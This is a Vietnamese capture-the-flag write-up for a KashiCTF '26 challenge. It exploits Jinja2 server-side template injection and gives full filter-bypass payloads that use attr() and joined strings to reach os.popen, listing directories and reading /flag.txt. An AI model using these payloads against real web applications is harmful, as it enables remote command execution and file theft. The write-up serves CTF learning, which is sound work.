# [Write-up] KashiCTF '26 - Nexus Neural Network (SSTI WAF Bypass)

## Tổng quan mục tiêu
* **Lỗ hổng:** Server-Side Template Injection (SSTI)
* **Kỹ thuật:** Lách qua bộ lọc (WAF Bypass) chặn các ký tự đặc biệt (`.`, `_`) và các từ khóa nhạy cảm (`os`, `popen`, v.v.) để đạt được RCE.

---

## Quá trình khai thác (Exploitation Steps)

### Bước 1: Trinh sát và xác định Template Engine
Đầu tiên, kiểm tra xem ứng dụng có dính lỗi SSTI hay không:

Thử payload `{{7*7}}`

<img width="692" height="346" alt="image" src="https://github.com/user-attachments/assets/e6477d50-32a6-40df-9d55-785c0ea657a3" />

Thử với payload `{{7*'7'}}`

Server đang dùng Jinja2 (Python)

<img width="692" height="346" alt="image" src="https://github.com/user-attachments/assets/8c8e61fc-e862-47b7-862e-f4c774100f5a" />

---

### Bước 2: Va chạm với WAF (Web Application Firewall)
Tiến hành đưa payload RCE cơ bản vào để kiểm tra các bộ lọc bảo mật của server:

`{{ lipsum.__globals__.os.popen('ls -la').read() }}` bị filter chặn
<img width="693" height="598" alt="image" src="https://github.com/user-attachments/assets/b4251821-64c1-4d58-81e1-939a361b6411" />

---

### Bước 3: Bypass WAF để thực thi mã (RCE)
Để lách qua filter, ta sử dụng `|attr()` thay cho dấu `.`, kết hợp mảng `['...']|join` và nối chuỗi để gọi các thuộc tính nhạy cảm.

Thực thi thành công lệnh `ls -la` ở thư mục hiện tại:
`{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')(['_','_','import','_','_']|join)('o'+'s')|attr('po'+'pen')('ls -la')|attr('re'+'ad')() }}`

<img width="692" height="346" alt="image" src="https://github.com/user-attachments/assets/3a6cb62b-607b-4d9f-8bfe-9f603fb43c00" />

---

### Bước 4: Tìm và Đọc Flag
Do không thấy flag ở thư mục hiện tại, tiến hành kiểm tra thư mục gốc `/`.

`{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')(['_','_','import','_','_']|join)('o'+'s')|attr('po'+'pen')('ls -la /')|attr('re'+'ad')() }}`

<img width="692" height="346" alt="image" src="https://github.com/user-attachments/assets/4c4bcff9-ff67-46ea-b0ed-184a9dbd1c77" />

Phát hiện file `flag.txt` ở thư mục gốc. Thay đổi lệnh để đọc nội dung file này:

`{{ lipsum|attr(['_','_','globals','_','_']|join)|attr('get')(['_','_','builtins','_','_']|join)|attr('get')(['_','_','import','_','_']|join)('o'+'s')|attr('po'+'pen')('cat /flag.txt')|attr('re'+'ad')() }}`

<img width="692" height="346" alt="image" src="https://github.com/user-attachments/assets/ed31f35e-900f-4f50-b36d-aa0f3ae3944e" />

---

##  Cờ (Flag)
`kashiCTF{gyGOVbEajlolvQABedpqTujXliEAM5}`
